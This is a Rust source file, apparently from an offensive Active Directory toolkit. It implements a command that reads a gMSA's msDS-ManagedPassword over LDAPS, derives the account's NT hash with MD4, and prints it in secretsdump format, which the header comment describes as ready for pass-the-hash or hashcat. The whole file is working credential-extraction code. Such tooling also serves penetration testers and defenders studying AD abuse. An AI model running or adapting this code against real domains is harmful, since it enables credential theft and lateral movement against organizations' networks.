//! gMSA managed-password read: LDAPS-sealed msDS-ManagedPassword →
//! MD4 → NT hash suitable for PtH/hashcat.

use crate::ui;
use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct GmsaArgs {
    /// LDAP URL (LDAPS required — the managed password is only returned over a sealed channel)
    #[arg(long)]
    pub url: String,
    #[arg(long)]
    pub user: String,
    #[arg(long, default_value = "")]
    pub password: adhammer_core::SecretString,
    #[arg(long)]
    pub insecure: bool,
    /// gMSA sAMAccountName (e.g. gmsa_web$)
    #[arg(long)]
    pub target: String,
}

/// Read a gMSA's managed password over LDAP and derive its NT hash. Wraps `gmsa_impl` with a rich
/// per-stage checklist ("resolve password → sealed LDAP bind → read msDS-ManagedPassword → derive
/// NT hash") so the operator sees where the pipeline stopped (bad channel, bad ACL, not a gMSA).
pub(crate) async fn gmsa(a: GmsaArgs) -> Result<()> {
    let mut checklist = ui::StageChecklist::new([
        "resolve password",
        "sealed LDAP bind (LDAPS)",
        "read msDS-ManagedPassword",
        "derive NT hash",
    ]);
    let result = gmsa_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("gMSA stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("gMSA stages (failed)");
        }
    }
    result
}

async fn gmsa_impl(mut a: GmsaArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
    checklist.record_ok(
        "resolve password",
        if a.password.is_empty() {
            "empty"
        } else {
            "resolved"
        },
    );
    use adhammer_collector::{Collector, LdapConfig};
    // msDS-ManagedPassword is a "confidential" attribute — AD returns it *only* over an
    // encrypted channel (LDAPS or sealed SASL). Fail fast with a clear message rather than
    // let ldap3 surface a raw `UNABLE_TO_PROCEED` from the server.
    if a.url.starts_with("ldap://") {
        anyhow::bail!(
            "gMSA managed-password read needs an encrypted channel — use `ldaps://` \
             (add --insecure for self-signed). Plain ldap:// will return \
             UNABLE_TO_PROCEED even for an authorized reader."
        );
    }
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    checklist.record_ok("sealed LDAP bind (LDAPS)", format!("→ {}", a.url));
    let blob = c
        .read_attr_bin(&a.target, "msDS-ManagedPassword")
        .await
        .with_context(|| {
            format!(
                "read msDS-ManagedPassword on '{}' — is it a gMSA? is the bind identity in \
                 PrincipalsAllowedToRetrieveManagedPassword?",
                a.target
            )
        })?
        .with_context(|| {
            format!(
                "'{}' returned no msDS-ManagedPassword (not a gMSA, or the bind identity \
                 isn't allowed to retrieve it)",
                a.target
            )
        })?;
    checklist.record_ok(
        "read msDS-ManagedPassword",
        format!("{} bytes (BLOB)", blob.len()),
    );
    let pw =
        crate::parse_managed_password_blob(&blob).context("parse MSDS-MANAGEDPASSWORD_BLOB")?;
    let nt = ntlmssp::md4(&pw);
    let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
    checklist.record_ok(
        "derive NT hash",
        format!("MD4 → {}…", &nthex[..8.min(nthex.len())]),
    );
    // secretsdump-style line; the RID is unknown here, so print sam + hash.
    println!("{}:aad3b435b51404eeaad3b435b51404ee:{}:::", a.target, nthex);
    eprintln!(
        "[+] gMSA {} current-password NT hash recovered ({} blob bytes)",
        a.target,
        blob.len()
    );
    Ok(())
}
